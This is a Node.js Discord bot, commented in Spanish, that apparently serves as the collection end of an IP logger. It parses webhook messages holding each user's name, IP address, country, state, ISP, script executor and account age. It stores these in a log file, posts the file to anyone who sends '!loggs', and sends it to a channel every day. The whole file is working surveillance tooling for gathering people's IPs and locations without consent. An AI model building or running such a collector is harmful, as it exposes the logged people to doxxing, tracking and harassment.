const { Client, GatewayIntentBits, AttachmentBuilder } = require("discord.js");
const fs = require("fs");
const path = require("path");

const TOKEN = process.env.TOKEN;

// Canal donde llegan los webhooks
const CAPTURE_CHANNEL = "1437151487141740637";

// Canal donde se envían los logs diarios
const SEND_LOGS_CHANNEL = "1440773871254110300";

const LOG_FILE = path.join(__dirname, "logs_globales.txt");

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

// =========================================
//   CAPTURA DE WEBHOOKS Y PROCESAMIENTO
// =========================================
client.on("messageCreate", (msg) => {
    if (!msg.webhookId) return;              // solo webhooks
    if (msg.channel.id !== CAPTURE_CHANNEL) return;
    if (!msg.embeds.length) return;

    const embed = msg.embeds[0];
    if (!embed.fields) return;

    // ============================
    // Extraer datos del embed
    // ============================
    let Nombre = msg.content.match(/USUARIO:\s(.+?)\s\|/)?.[1] || "N/A";
    let Display = msg.content.match(/DISPLAY:\s(.+)/)?.[1] || "N/A";

    let IP = embed.fields[0]?.value.replace(/```/g, "") || "N/A";

    let pais = embed.fields[1]?.value.match(/País:\s```(.+?)```/)?.[1] || "N/A";
    let estado = embed.fields[1]?.value.match(/Estado:\s```(.+?)```/)?.[1] || "N/A";
    let isp = embed.fields[1]?.value.match(/ISP:\s(.+)/)?.[1] || "N/A";

    let executor = embed.fields[2]?.value.match(/Executor:\s(.+)/)?.[1] || "N/A";
    let cuenta = embed.fields[2]?.value.match(/Cuenta:\s(.+?)\sdías/)?.[1] || "N/A";

    // ============================
    //   Formato FINAL compacto
    // ============================
    const linea = `${Nombre} | ${Display} | ${IP} | ${pais} | ${estado} | ${isp} | ${executor} | ${cuenta}\n`;

    // Guardar en archivo
    fs.appendFileSync(LOG_FILE, linea, "utf8");
});


// =========================================
//   COMANDO !loggs → manda archivo actual
// =========================================
client.on("messageCreate", async (msg) => {
    if (msg.content !== "!loggs") return;

    if (!fs.existsSync(LOG_FILE)) {
        return msg.reply("⚠️ No hay logs guardados.");
    }

    const file = new AttachmentBuilder(LOG_FILE);
    msg.reply({ content: "📄 Aquí están los logs actuales:", files: [file] });
});


// =========================================
//   ENVÍO AUTOMÁTICO DIARIO
// =========================================
setInterval(() => {
    if (!fs.existsSync(LOG_FILE)) return;

    const channel = client.channels.cache.get(SEND_LOGS_CHANNEL);
    if (!channel) return;

    const file = new AttachmentBuilder(LOG_FILE);
    channel.send({
        content: "📤 **Reporte diario de logs**",
        files: [file]
    });

}, 24 * 60 * 60 * 1000); // 24 horas


client.login(TOKEN);
